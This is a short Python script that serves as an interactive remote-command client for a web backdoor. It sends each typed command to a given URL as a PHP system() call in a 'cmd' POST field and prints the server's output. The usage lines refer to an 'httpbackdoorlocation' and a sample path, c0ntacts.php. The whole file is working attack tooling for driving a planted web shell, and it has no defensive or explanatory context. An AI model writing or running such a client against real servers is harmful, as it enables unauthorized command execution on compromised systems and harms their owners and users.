#!/usr/bin/python3
import requests
import sys
arguments=sys.argv
scriptname=arguments[0]
session=requests.Session()

if(len(arguments) == 2):
	url=arguments[1]
	command=""
	while command != 'q':
		command=input("#: ")
		payload=f"system('{command}');"
		response=session.post(url,data={"cmd":f"{payload}"})
		content=response.text
		try:
			content=content.decode().strip()
		except:
			content=content.strip()

		print(f'{content}\n')
else:
	print(f'\tUsage : {scriptname} httpbackdoorlocation com')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php')
	print(f'\t      : {scriptname} http://localhost/tests/c0ntacts.php ')
